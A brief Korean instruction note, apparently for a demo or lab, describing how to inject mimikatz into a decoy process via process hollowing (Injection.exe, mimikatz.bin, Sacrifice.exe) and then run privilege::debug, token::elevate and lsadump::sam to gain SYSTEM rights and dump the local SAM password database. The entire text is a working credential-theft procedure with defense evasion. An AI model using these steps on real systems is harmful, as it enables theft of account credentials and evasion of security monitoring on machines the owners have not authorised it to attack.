
## mimikatz

Hollowing Injection.exe mimikatz.bin Sacrifice.exe 

privilege::debug 디버그 권한 휙득

token::elevate System 권한 휙득

lsadump::sam : 로컬 계정 암호 데이터베이스(SAM) 덤프

각각 순서대로 실행해서 덤프 보여주시면 됩니다.

Sacrifice 프로그램은 로그 출력 프로그램으로 아무 특별한 기능이 없습니다.
